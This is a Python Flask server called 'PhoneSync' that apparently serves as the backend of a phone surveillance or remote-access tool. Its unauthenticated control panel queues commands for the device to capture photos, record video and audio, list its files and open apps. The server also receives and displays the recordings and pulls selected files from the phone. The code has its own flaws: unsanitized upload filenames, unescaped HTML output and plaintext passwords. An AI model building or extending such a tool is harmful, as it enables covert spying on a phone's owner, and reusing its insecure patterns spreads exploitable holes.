from flask import Flask, request, jsonify
import sqlite3
import os
from flask import send_from_directory

requested_file = ""
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app = Flask(__name__)
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        command TEXT
    )
    """)

    conn.commit()
    conn.close()

init_db()
@app.route("/")
def home():
    return "PhoneSync Server Running Successfully!"

@app.route("/register", methods=["POST"])
def register():

    data = request.json

    username = data.get("username")
    email = data.get("email")
    password = data.get("password")

    try:
        conn = sqlite3.connect("database.db")
        cursor = conn.cursor()

        cursor.execute(
            "INSERT INTO users (username, email, password) VALUES (?, ?, ?)",
            (username, email, password)
        )

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "message": "User Registered Successfully"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        })
@app.route("/login", methods=["POST"])
def login():

    data = request.json

    email = data.get("email")
    password = data.get("password")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT * FROM users WHERE email=? AND password=?",
        (email, password)
    )

    user = cursor.fetchone()
    conn.close()

    if user:
        return jsonify({
            "status": "success",
            "message": "Login Successful"
        })

    return jsonify({
        "status": "error",
        "message": "Invalid Email or Password"
    })
@app.route("/upload", methods=["POST"])
def upload_file():

    if "file" not in request.files:
        return jsonify({
            "status": "error",
            "message": "No file selected"
        })

    file = request.files["file"]

    filename = file.filename
    save_path = os.path.join(UPLOAD_FOLDER, filename)

    file.save(save_path)

    return jsonify({
        "status": "success",
        "filename": filename
    })


html = """
<html>
<body>

<h2>Uploaded Files</h2>

<table border="1" cellpadding="10">

<tr>
<th>File Name</th>
<th>Open</th>
<th>Download</th>
</tr>
"""

@app.route('/files')
def list_files():

    photos = []
    audios = []

    for f in os.listdir(UPLOAD_FOLDER):

        path = os.path.join(UPLOAD_FOLDER, f)

        item = {
            "name": f,
            "modified": os.path.getmtime(path)
        }

        if f.endswith(".jpg") or f.endswith(".png"):
            photos.append(item)

        elif f.endswith(".m4a") or f.endswith(".mp3"):
            audios.append(item)

    html = """
    <html>
    <body>

    <h2>Uploaded Files</h2>

    <table border="1" cellpadding="10">

    <tr>
        <th>File Name</th>
        <th>Open</th>
        <th>Download</th>
    </tr>
    """

    for f in photos + audios:

        html += f"""
        <tr>

            <td>{f['name']}</td>

            <td>
                <a href="/view/{f['name']}" target="_blank">
                    Open
                </a>
            </td>

            <td>
                <a href="/download/{f['name']}">
                    Download
                </a>
            </td>

        </tr>
        """

    html += """
    </table>

    </body>
    </html>
    """

    return html

file_list_data = []
@app.route('/download/<filename>')
def download_file(filename):

    return send_from_directory(
        UPLOAD_FOLDER,
        filename,
        as_attachment=True
    )
@app.route('/view/<filename>')
def view_file(filename):
    return send_from_directory(
        UPLOAD_FOLDER,
        filename
    )
mobile_files = []

@app.route("/filelist", methods=["POST"])
def filelist():

    global mobile_files

    data = request.form.get("filelist")

    if data:
        import json
        mobile_files = json.loads(data)

    return jsonify({
        "status": "success"
    })

@app.route("/mobile_files")
def mobile_files_list():
    return jsonify(mobile_files)

@app.route("/mobile_files_view")
def mobile_files_view():

    html = """
<html>
<body>
<table border="1">
<tr>
<th>Name</th>
<th>Size</th>
<th>Download</th>
</tr>
"""

    for f in mobile_files:
        html += f"""
        <tr>
            <td>{f['name']}</td>
            <td>{f['size']}</td>

        <td>
            <form action="/request_mobile_file" method="post">

                <input
                    type="hidden"
                    name="path"
                    value="{f['path']}"
                >

                <button type="submit">
                    Download
                </button>

            </form>
        </td>

    </tr>
    """

    html += """
        </table>
    </body>
    </html>
    """
    return html
    
@app.route("/request_file", methods=["POST"])
def request_file():

    global requested_file

    data = request.json
    requested_file = data.get("path", "")

    return jsonify({
        "status": "success"
    })
@app.route("/get_requested_file")
def get_requested_file():

    global requested_file

    path = requested_file

    requested_file = ""

    return jsonify({
        "path": path
    })


requested_file = ""

@app.route("/request_mobile_file", methods=["POST"])
def request_mobile_file():

    global requested_file

    requested_file = request.form.get("path")

    return f"""
    <h2>File Requested</h2>

    <p>{requested_file}</p>

    <a href="/mobile_files_view">
        Back
    </a>
    """
@app.route("/control")
def control():

    return """
    <html>
    <body>

    <h2>PhoneSync Control Panel</h2>

    <form action="/send_command_ui" method="post">
        <button name="command" value="photo_request">
            Capture Photo
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="start_video">
            Start Video
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="stop_video">
            Stop Video
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="start_audio">
            Start Audio
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="stop_audio">
            Stop Audio
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="get_files">
            Get Files
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="open_chrome">
            Open Chrome
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="open_youtube">
            Open YouTube
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="open_instagram">
            Open Instagram
        </button>
    </form>

    <br>

    <form action="/send_command_ui" method="post">
        <button name="command" value="open_whatsapp">
            Open WhatsApp
        </button>
    </form>

    </body>
    </html>
    """
@app.route("/send_command_ui", methods=["POST"])
def send_command_ui():

    command = request.form.get("command")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "INSERT INTO commands (command) VALUES (?)",
        (command,)
    )

    conn.commit()
    conn.close()

    return f"""
    <h3>Command Sent</h3>
    <p>{command}</p>
    <a href="/control">Back</a>
    """
@app.route("/send_command", methods=["POST"])
def send_command():

    data = request.json
    command = data.get("command")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "INSERT INTO commands (command) VALUES (?)",
        (command,)
    )

    conn.commit()
    conn.close()

    return jsonify({
        "status": "success",
        "command": command
    })
@app.route("/recordings")
def recordings():

    html = """
    <html>
    <body>

    <h2>Audio Recordings</h2>
    """

    for f in os.listdir(UPLOAD_FOLDER):

        if f.endswith(".m4a") or f.endswith(".mp3"):

            html += f"""
            <p>{f}</p>

            <audio controls>
                <source src="/view/{f}">
            </audio>

            <hr>
            """

    html += """
    </body>
    </html>
    """

    return html
@app.route("/photos")
def photos():

    html = "<h2>Photos</h2>"

    for f in os.listdir(UPLOAD_FOLDER):

        if f.endswith(".jpg") or f.endswith(".png"):

            html += f"""
            <img src="/view/{f}" width="300">
            <br><br>
            """

    return html
@app.route("/videos")
def videos():

    html = "<h2>Videos</h2>"

    for f in os.listdir(UPLOAD_FOLDER):

        if f.endswith(".mp4"):

            html += f"""
            <video width="400" controls>
                <source src="/view/{f}">
            </video>

            <br><br>
            """

    return html

@app.route("/get_command", methods=["GET"])
def get_command():

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT id, command FROM commands ORDER BY id DESC LIMIT 1"
    )

    result = cursor.fetchone()

    if result:

        cursor.execute(
            "DELETE FROM commands WHERE id=?",
            (result[0],)
        )

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "id": result[0],
            "command": result[1]
        })

    conn.close()

    return jsonify({
        "status": "empty",
        "command": ""
    })
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)